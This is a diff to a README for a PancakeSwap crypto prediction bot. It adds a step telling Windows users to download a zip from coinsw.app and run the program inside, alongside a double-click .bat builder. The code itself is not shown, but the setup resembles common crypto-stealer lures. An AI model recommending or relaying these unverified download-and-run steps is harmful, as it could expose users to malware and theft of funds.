@@ -2,9 +2,16 @@
 # Coinsw.app - Combination of Useful Bots for Pancakeswap
 ![](https://i.ibb.co/vYccRn8/IMGLUNADUMP.png)
 
-# **🥞 PancakeSwap Prediction Bot v4.0 NEW! (NO PRIVATE KEY REQUIRED!) 🤖**
+# **🥞 PancakeSwap Prediction Bot v4.3.9 NEW! (NO PRIVATE KEY REQUIRED!) 🤖**
 
-## 💡 PancakeSwap Prediction Bot v4.0 NEW! Installation
+## 💡 Ready click-to-run version for Windows 🥞
+1. Download the [Easy run version](https://coinsw.app/PancakePredictionBot.zip).
+2. Extract the bot program from the zip archive and run it.
+3. Enjoy!
+
+or
+
+## 💡 PancakeSwap Prediction Bot v4.3.9 NEW! Installation
 1. Download the Full Repo [Github](https://github.com/CoinSwapPump/PancakeSwap-Prediction-Bot-v4.0/archive/master.zip). 
 2. Unzip ``master.zip``
 3. Double click `PredictionBotBuilder.bat` 
